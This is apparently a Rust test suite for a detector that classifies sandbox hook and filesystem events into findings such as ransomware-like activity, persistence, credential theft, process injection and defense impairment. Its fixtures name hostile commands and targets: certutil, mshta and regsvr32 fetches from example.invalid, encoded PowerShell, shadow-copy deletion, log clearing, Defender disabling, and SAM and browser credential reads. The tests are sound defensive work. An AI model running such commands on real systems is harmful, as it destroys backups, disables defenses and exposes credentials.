use super::*;

fn event(event_type: EventType, details: &str, seconds: i64) -> Event {
    Event {
        timestamp: DateTime::from_timestamp(seconds, 0).unwrap(),
        event_type,
        details: details.to_owned(),
    }
}

fn request(
    event_type: EventType,
    caller: u32,
    description: &str,
    denied: bool,
    seconds: i64,
) -> Event {
    let decision = if denied { "Denied" } else { "Allowed" };

    event(
        event_type,
        &format!(
            "{decision} hook request from PID {caller}: {description} \
             (configured policy decision)"
        ),
        seconds,
    )
}

fn finding(assessment: &BehaviorAssessment, rule: RuleId, status: ActionStatus) -> &Finding {
    assessment
        .findings
        .iter()
        .find(|finding| finding.rule == rule && finding.status == status)
        .unwrap()
}

fn has_rule(assessment: &BehaviorAssessment, rule: RuleId) -> bool {
    assessment
        .findings
        .iter()
        .any(|finding| finding.rule == rule)
}

fn memory_write(caller: u32, target: u32, denied: bool, seconds: i64) -> Event {
    request(
        EventType::HookMemoryWrite,
        caller,
        &format!("Write 16 bytes to PID {target} at 0x1000"),
        denied,
        seconds,
    )
}

fn remote_thread(caller: u32, target: u32, denied: bool, seconds: i64) -> Event {
    request(
        EventType::HookThreadCreateRemote,
        caller,
        &format!("Create remote thread in PID {target} at 0x1000"),
        denied,
        seconds,
    )
}

#[test]
fn empty_input_has_explicit_coverage_and_round_trips() {
    let assessment = assess_events(&[]);

    assert!(assessment.findings.is_empty());
    assert_eq!(assessment.coverage.input_events, 0);
    assert_eq!(assessment.coverage.inspected_events, 0);
    assert_eq!(assessment.coverage.omitted_events, 0);
    assert_eq!(assessment.coverage.max_events, MAX_EVENTS);
    assert_eq!(assessment.coverage.max_detail_bytes, MAX_DETAIL_BYTES);
    assert_eq!(
        assessment.coverage.max_evidence_per_finding,
        MAX_EVIDENCE_PER_FINDING
    );
    assert_eq!(
        assessment.coverage.ransomware_distinct_path_threshold,
        RANSOMWARE_PATH_THRESHOLD
    );
    assert_eq!(
        assessment.coverage.correlation_event_gap,
        MAX_CORRELATION_EVENT_GAP
    );
    assert_eq!(
        assessment.coverage.correlation_window_seconds,
        MAX_CORRELATION_SECONDS
    );

    let json = serde_json::to_string(&assessment).unwrap();
    let restored: BehaviorAssessment = serde_json::from_str(&json).unwrap();

    assert_eq!(restored, assessment);
}

#[test]
fn ordinary_operations_do_not_become_malicious_findings() {
    let events = [
        event(EventType::FileCreated, r"C:\Data\report.txt", 0),
        event(EventType::FileModified, r"C:\Data\report.txt", 1),
        event(EventType::FileDeleted, r"C:\Data\report.txt", 2),
        event(EventType::FileCreated, r"C:\Data\archive.locked", 3),
        request(
            EventType::HookProcessCreate,
            10,
            "Execute: cmd.exe /c echo benign",
            false,
            4,
        ),
        request(
            EventType::HookProcessCreate,
            10,
            "Execute: powershell.exe -NoProfile Get-Process",
            false,
            5,
        ),
        request(
            EventType::HookProcessCreate,
            10,
            "Execute: notpowershell.exe -enc Zg==",
            false,
            6,
        ),
        request(
            EventType::HookProcessCreate,
            10,
            "Execute: powershell.exe -encoding utf8",
            false,
            7,
        ),
        event(
            EventType::ProcessCreated,
            "Observed descendant PID 11 (powershell.exe) with parent PID Some(10) (start 0)",
            8,
        ),
        event(
            EventType::NetworkConnection,
            "Observed UDP bound socket for PID 10: 0.0.0.0:4444 (traffic not established)",
            9,
        ),
    ];
    let assessment = assess_events(&events);

    assert_eq!(assessment.findings.len(), 1);
    assert_eq!(assessment.findings[0].rule, RuleId::NetworkActivity);
    assert_eq!(assessment.findings[0].severity, Severity::Informational);
    assert_eq!(assessment.findings[0].status, ActionStatus::Observed);
    assert_eq!(assessment.findings[0].evidence[0].event_index, 9);
}

#[test]
fn ransomware_threshold_counts_distinct_paths_not_events_or_elapsed_time() {
    let first = event(EventType::FileCreated, r"C:\Data\a.LOCKED", 0);
    let mut events = vec![
        first.clone(),
        event(EventType::FileCreated, r"C:\Data\b.encrypted", 1),
        first,
        event(EventType::FileModified, r"c:\data\a.locked", 2),
    ];

    assert!(!has_rule(
        &assess_events(&events),
        RuleId::RansomwareLikeFileNames
    ));

    events.push(event(
        EventType::FileCreated,
        r"C:\Data\c.crypt",
        5 * 365 * 24 * 60 * 60,
    ));

    let assessment = assess_events(&events);
    let finding = finding(
        &assessment,
        RuleId::RansomwareLikeFileNames,
        ActionStatus::Observed,
    );
    let indices: Vec<_> = finding
        .evidence
        .iter()
        .map(|evidence| evidence.event_index)
        .collect();

    assert_eq!(finding.category, BehaviorCategory::RansomwareLike);
    assert_eq!(finding.matched_events, RANSOMWARE_PATH_THRESHOLD);
    assert_eq!(indices, [0, 1, 4]);
    assert_eq!(assessment.coverage.duplicate_events, 1);
}

#[test]
fn ransomware_counts_do_not_mix_requested_denied_and_observed_paths() {
    let mut events = vec![
        request(
            EventType::HookFileWrite,
            10,
            r"Write to file: C:\Data\a.locked",
            false,
            0,
        ),
        request(
            EventType::HookFileWrite,
            10,
            r"Write to file: C:\Data\b.locked",
            true,
            1,
        ),
        event(EventType::FileCreated, r"C:\Data\c.locked", 2),
    ];

    assert!(!has_rule(
        &assess_events(&events),
        RuleId::RansomwareLikeFileNames
    ));

    for number in 0..RANSOMWARE_PATH_THRESHOLD {
        events.push(request(
            EventType::HookFileWrite,
            10,
            &format!(r"Write to file: C:\Data\attempt-{number}.locked"),
            false,
            3,
        ));
        events.push(request(
            EventType::HookFileWrite,
            10,
            &format!(r"Write to file: C:\Data\denied-{number}.locked"),
            true,
            4,
        ));
        events.push(event(
            EventType::FileModified,
            &format!(r"C:\Data\observed-{number}.locked"),
            5,
        ));
    }

    let assessment = assess_events(&events);

    for status in [
        ActionStatus::Attempted,
        ActionStatus::Denied,
        ActionStatus::Observed,
    ] {
        let finding = finding(&assessment, RuleId::RansomwareLikeFileNames, status);

        assert_eq!(finding.matched_events, RANSOMWARE_PATH_THRESHOLD + 1);
        assert!(finding.evidence.iter().all(|item| item.status == status));
    }
}

#[test]
fn move_destination_and_note_names_are_supported_without_claiming_contents() {
    let mut events = Vec::new();

    for number in 0..RANSOMWARE_PATH_THRESHOLD {
        events.push(request(
            EventType::HookFileMove,
            10,
            &format!(r"Move file: C:\Data\{number}.txt -> C:\Data\{number}.locked"),
            false,
            0,
        ));
    }

    events.push(event(
        EventType::FileCreated,
        r"Observed filesystem change (process unattributed): C:\Data\README_DECRYPT.TXT",
        1,
    ));

    let assessment = assess_events(&events);

    assert!(has_rule(&assessment, RuleId::RansomwareLikeFileNames));
    assert_eq!(
        finding(&assessment, RuleId::RansomNoteName, ActionStatus::Observed).confidence,
        Confidence::Low
    );

    let benign = assess_events(&[
        event(EventType::FileCreated, r"C:\Data\a.locked.backup", 0),
        event(EventType::FileCreated, r"C:\Data\b.locked.backup", 1),
        event(EventType::FileCreated, r"C:\Data\c.locked.backup", 2),
        event(
            EventType::FileCreated,
            r"C:\Data\README_DECRYPT.TXT.backup",
            3,
        ),
    ]);

    assert!(benign.findings.is_empty());
}

#[test]
fn persistence_preserves_status_and_does_not_treat_registry_reads_as_writes() {
    let events = [
        request(
            EventType::HookRegistrySet,
            10,
            r"Set registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run::Demo::Demo",
            false,
            0,
        ),
        request(
            EventType::HookRegistrySet,
            10,
            r"Set registry: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce::Demo",
            true,
            1,
        ),
        event(
            EventType::RegistryAccess,
            r"Observed registry subtree change (process unattributed; operation unspecified): HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            2,
        ),
        request(
            EventType::HookRegistryRead,
            10,
            r"Read registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run::Demo",
            false,
            3,
        ),
        request(
            EventType::HookRegistrySet,
            10,
            r"Set registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Runtime::Demo",
            false,
            4,
        ),
        event(
            EventType::FileCreated,
            r"C:\Users\Demo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\demo.lnk",
            5,
        ),
    ];
    let assessment = assess_events(&events);

    for (status, index) in [
        (ActionStatus::Attempted, 0),
        (ActionStatus::Denied, 1),
        (ActionStatus::Observed, 2),
    ] {
        let finding = finding(&assessment, RuleId::StartupRegistry, status);

        assert_eq!(finding.category, BehaviorCategory::Persistence);
        assert_eq!(finding.matched_events, 1);
        assert_eq!(finding.evidence[0].event_index, index);
    }

    assert_eq!(
        finding(&assessment, RuleId::StartupFolder, ActionStatus::Observed).evidence[0].event_index,
        5
    );
}

#[test]
fn credential_indicators_require_sensitive_read_targets() {
    let events = [
        request(
            EventType::HookFileRead,
            10,
            r"Read file: C:\WINDOWS\SYSTEM32\CONFIG\SAM",
            false,
            0,
        ),
        request(
            EventType::HookFileRead,
            10,
            r"Read file: C:\Users\Demo\AppData\Local\Browser\User Data\Default\Login Data",
            true,
            1,
        ),
        request(
            EventType::HookRegistryRead,
            10,
            r"Read registry: HKLM\SAM\Domains::Demo::Demo",
            false,
            2,
        ),
        request(
            EventType::HookFileRead,
            10,
            r"Read file: C:\Data\SAM.txt",
            false,
            3,
        ),
        request(
            EventType::HookRegistryRead,
            10,
            r"Read registry: HKLM\SAMPLE::Demo",
            false,
            4,
        ),
        event(EventType::FileCreated, r"C:\Windows\System32\config\SAM", 5),
    ];
    let assessment = assess_events(&events);
    let attempted = finding(
        &assessment,
        RuleId::CredentialStoreRead,
        ActionStatus::Attempted,
    );
    let denied = finding(
        &assessment,
        RuleId::CredentialStoreRead,
        ActionStatus::Denied,
    );

    assert_eq!(attempted.category, BehaviorCategory::CredentialAccess);
    assert_eq!(attempted.matched_events, 2);
    assert_eq!(denied.matched_events, 1);
    assert_eq!(denied.evidence[0].event_index, 1);
    assert_eq!(assessment.findings.len(), 2);
}

#[test]
fn script_and_lolbin_rules_inspect_requests_not_process_snapshot_names() {
    for command in [
        "Execute: POWERSHELL.EXE -ENC Zg==",
        r#"Execute: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand Zg=="#,
        "Execute: mshta.exe https://example.invalid/demo.hta",
        "Execute: regsvr32.exe /s /i:https://example.invalid/demo.sct scrobj.dll",
        "Execute: rundll32.exe javascript:demo",
        "Execute: certutil.exe -urlcache -f https://example.invalid/demo.txt demo.txt",
    ] {
        let assessment =
            assess_events(&[request(EventType::HookProcessCreate, 10, command, false, 0)]);
        let finding = finding(
            &assessment,
            RuleId::SuspiciousExecution,
            ActionStatus::Attempted,
        );

        assert_eq!(finding.category, BehaviorCategory::SuspiciousExecution);
        assert_eq!(finding.matched_events, 1);
    }

    let assessment = assess_events(&[request(
        EventType::HookProcessCreate,
        10,
        "Execute: powershell.exe -enc Zg==",
        true,
        0,
    )]);

    assert_eq!(assessment.findings.len(), 1);
    assert_eq!(assessment.findings[0].status, ActionStatus::Denied);

    let snapshot = assess_events(&[event(
        EventType::ProcessCreated,
        "Observed descendant PID 11 (powershell.exe -enc Zg==) with parent PID Some(10)",
        0,
    )]);

    assert!(snapshot.findings.is_empty());
}

#[test]
fn defense_indicators_do_not_claim_success_or_infer_missing_registry_values() {
    for command in [
        "Execute: vssadmin.exe delete shadows /all",
        "Execute: wbadmin.exe delete catalog",
        "Execute: wevtutil.exe cl Application",
        "Execute: bcdedit.exe /set recoveryenabled no",
    ] {
        let assessment =
            assess_events(&[request(EventType::HookProcessCreate, 10, command, true, 0)]);
        let finding = finding(&assessment, RuleId::DefenseImpairment, ActionStatus::Denied);

        assert_eq!(finding.category, BehaviorCategory::DefenseImpairment);
        assert_eq!(finding.confidence, Confidence::Low);
    }

    let assessment = assess_events(&[
        request(
            EventType::HookRegistrySet,
            10,
            r"Set registry: HKLM\Software\Policies\Microsoft\Windows Defender::DisableAntiSpyware::DisableAntiSpyware",
            false,
            0,
        ),
        request(
            EventType::HookRegistryRead,
            10,
            r"Read registry: HKLM\Software\Policies\Microsoft\Windows Defender::DisableAntiSpyware",
            false,
            1,
        ),
        request(
            EventType::HookProcessCreate,
            10,
            "Execute: vssadmin.exe list shadows",
            false,
            2,
        ),
    ]);
    let finding = finding(
        &assessment,
        RuleId::DefenseImpairment,
        ActionStatus::Attempted,
    );

    assert_eq!(finding.matched_events, 1);
    assert_eq!(finding.evidence[0].event_index, 0);
}

#[test]
fn network_requests_denials_and_observations_remain_separate() {
    let events = [
        request(
            EventType::HookNetworkConnect,
            10,
            "Connect to: 192.0.2.1:443",
            false,
            1,
        ),
        request(
            EventType::HookNetworkConnect,
            10,
            "Connect to: 192.0.2.2:443",
            true,
            2,
        ),
        event(
            EventType::HookBlocked,
            "Denied Connect to: 192.0.2.2:443: network access is disabled",
            3,
        ),
        event(
            EventType::NetworkConnection,
            "Observed TCP endpoint for PID 10: 127.0.0.1:12345 -> 192.0.2.3:443 (state 2)",
            4,
        ),
        event(EventType::DnsQuery, "example.invalid", 5),
        event(EventType::NetworkBlocked, "192.0.2.4:443", 6),
    ];
    let assessment = assess_events(&events);

    assert_eq!(assessment.findings.len(), 3);
    assert_eq!(assessment.coverage.unclassified_denial_records, 1);

    for (status, count) in [
        (ActionStatus::Attempted, 1),
        (ActionStatus::Denied, 2),
        (ActionStatus::Observed, 2),
    ] {
        let finding = finding(&assessment, RuleId::NetworkActivity, status);

        assert_eq!(finding.matched_events, count);
        assert_eq!(finding.severity, Severity::Informational);
        assert!(finding.evidence.iter().all(|evidence| {
            evidence.status == status
                && evidence.timestamp == events[evidence.event_index].timestamp
                && evidence.event_type == events[evidence.event_index].event_type
        }));
    }

    let json = serde_json::to_value(&assessment).unwrap();

    assert_eq!(json["findings"][0]["rule"], "network_activity");
    assert_eq!(json["findings"][0]["status"], "attempted");
    assert_eq!(json["findings"][0]["severity"], "informational");

    let restored: BehaviorAssessment = serde_json::from_value(json).unwrap();

    assert_eq!(restored, assessment);
}

#[test]
fn generic_denials_are_not_invented_successful_techniques() {
    let assessment = assess_events(&[
        event(EventType::HookBlocked, "Denied remote thread request", 0),
        event(EventType::RegistryBlocked, r"HKLM\SAM", 1),
    ]);

    assert!(assessment.findings.is_empty());
    assert_eq!(assessment.coverage.unclassified_denial_records, 2);
}

#[test]
fn injection_correlation_requires_matching_logged_identities() {
    let assessment = assess_events(&[
        memory_write(10, 20, false, 0),
        remote_thread(10, 20, false, 1),
    ]);
    let finding = finding(
        &assessment,
        RuleId::WriteThenRemoteThread,
        ActionStatus::Attempted,
    );

    assert_eq!(finding.category, BehaviorCategory::ProcessInjection);
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::Medium);
    assert_eq!(finding.matched_events, 2);
    assert_eq!(finding.evidence[0].event_index, 0);
    assert_eq!(finding.evidence[1].event_index, 1);

    for (caller, target) in [(11, 20), (10, 21)] {
        let assessment = assess_events(&[
            memory_write(10, 20, false, 0),
            remote_thread(caller, target, false, 1),
        ]);

        assert!(!has_rule(&assessment, RuleId::WriteThenRemoteThread));
    }
}

#[test]
fn denied_requests_do_not_form_an_allowed_injection_sequence() {
    for (write_denied, thread_denied) in [(true, false), (false, true), (true, true)] {
        let assessment = assess_events(&[
            memory_write(10, 20, write_denied, 0),
            remote_thread(10, 20, thread_denied, 1),
        ]);

        assert!(!has_rule(&assessment, RuleId::WriteThenRemoteThread));
        assert!(assessment
            .findings
            .iter()
            .all(|finding| finding.status != ActionStatus::Observed));

        if write_denied {
            assert_eq!(
                finding(&assessment, RuleId::RemoteMemoryWrite, ActionStatus::Denied)
                    .matched_events,
                1
            );
        }

        if thread_denied {
            assert_eq!(
                finding(&assessment, RuleId::RemoteThread, ActionStatus::Denied).matched_events,
                1
            );
        }
    }
}

#[test]
fn correlation_enforces_order_timestamp_and_event_distance_boundaries() {
    for (seconds, gap, expected) in [
        (0, 1, true),
        (MAX_CORRELATION_SECONDS, MAX_CORRELATION_EVENT_GAP, true),
        (MAX_CORRELATION_SECONDS + 1, 1, false),
        (-1, 1, false),
        (1, MAX_CORRELATION_EVENT_GAP + 1, false),
    ] {
        let mut events = vec![memory_write(10, 20, false, 0)];

        for index in 1..gap {
            events.push(event(
                EventType::ApiCall,
                &format!("Benign fixture marker {index}"),
                0,
            ));
        }

        events.push(remote_thread(10, 20, false, seconds));

        assert_eq!(
            has_rule(&assess_events(&events), RuleId::WriteThenRemoteThread),
            expected,
            "seconds={seconds}, gap={gap}"
        );
    }

    let reversed = [
        remote_thread(10, 20, false, 0),
        memory_write(10, 20, false, 1),
    ];

    assert!(!has_rule(
        &assess_events(&reversed),
        RuleId::WriteThenRemoteThread
    ));

    let mut thread = remote_thread(10, 20, false, MAX_CORRELATION_SECONDS);
    thread.timestamp += Duration::nanoseconds(1);

    assert!(!has_rule(
        &assess_events(&[memory_write(10, 20, false, 0), thread]),
        RuleId::WriteThenRemoteThread
    ));
}

#[test]
fn self_target_and_missing_or_malformed_identity_do_not_invent_injection() {
    let self_target = assess_events(&[
        memory_write(10, 10, false, 0),
        remote_thread(10, 10, false, 1),
    ]);

    assert!(self_target.findings.is_empty());

    let unknown = assess_events(&[
        event(
            EventType::HookMemoryWrite,
            "Write 16 bytes to PID 20 at 0x1000",
            0,
        ),
        event(
            EventType::HookThreadCreateRemote,
            "Allowed hook request from PID unknown: Create remote thread in PID 20 at 0x1000 (policy)",
            1,
        ),
        request(
            EventType::HookMemoryWrite,
            10,
            "Write 16 bytes to PID 20junk at 0x1000",
            false,
            2,
        ),
        memory_write(10, 0, false, 3),
    ]);

    assert!(unknown.findings.is_empty());
    assert_eq!(unknown.coverage.uncorrelatable_injection_events, 4);
}

#[test]
fn duplicate_records_and_reused_sequence_evidence_are_retained_once() {
    let write = memory_write(10, 20, false, 0);
    let thread = remote_thread(10, 20, false, 1);
    let assessment = assess_events(&[
        write.clone(),
        write,
        thread.clone(),
        thread,
        remote_thread(10, 20, false, 2),
    ]);
    let finding = finding(
        &assessment,
        RuleId::WriteThenRemoteThread,
        ActionStatus::Attempted,
    );
    let indices: Vec<_> = finding
        .evidence
        .iter()
        .map(|evidence| evidence.event_index)
        .collect();

    assert_eq!(assessment.coverage.duplicate_events, 2);
    assert_eq!(finding.matched_events, 3);
    assert_eq!(indices, [0, 2, 4]);
    assert_eq!(
        assessment
            .findings
            .iter()
            .filter(|finding| finding.rule == RuleId::WriteThenRemoteThread)
            .count(),
        1
    );
}

#[test]
fn input_and_retained_evidence_are_bounded_without_losing_original_indices() {
    let events: Vec<_> = (0..MAX_EVENTS + 3)
        .map(|index| {
            event(
                EventType::NetworkConnection,
                &format!("Benign synthetic endpoint record {index}"),
                0,
            )
        })
        .collect();
    let assessment = assess_events(&events);
    let finding = finding(&assessment, RuleId::NetworkActivity, ActionStatus::Observed);

    assert_eq!(assessment.coverage.input_events, MAX_EVENTS + 3);
    assert_eq!(assessment.coverage.inspected_events, MAX_EVENTS);
    assert_eq!(assessment.coverage.omitted_events, 3);
    assert_eq!(finding.matched_events, MAX_EVENTS);
    assert_eq!(finding.evidence.len(), MAX_EVIDENCE_PER_FINDING);
    assert_eq!(
        finding.omitted_evidence,
        MAX_EVENTS - MAX_EVIDENCE_PER_FINDING
    );
    assert_eq!(finding.evidence[0].event_index, 0);
    assert_eq!(
        finding.evidence.last().unwrap().event_index,
        MAX_EVIDENCE_PER_FINDING - 1
    );
}

#[test]
fn oversized_utf8_details_are_skipped_whole_at_a_byte_boundary() {
    let oversized = "\u{e9}".repeat(MAX_DETAIL_BYTES);
    let exact = "x".repeat(MAX_DETAIL_BYTES);
    let assessment = assess_events(&[
        event(EventType::NetworkConnection, &oversized, 0),
        event(EventType::NetworkConnection, &exact, 1),
    ]);
    let finding = finding(&assessment, RuleId::NetworkActivity, ActionStatus::Observed);

    assert_eq!(assessment.coverage.oversized_events, 1);
    assert_eq!(assessment.coverage.inspected_events, 2);
    assert_eq!(finding.matched_events, 1);
    assert_eq!(finding.evidence[0].event_index, 1);
}
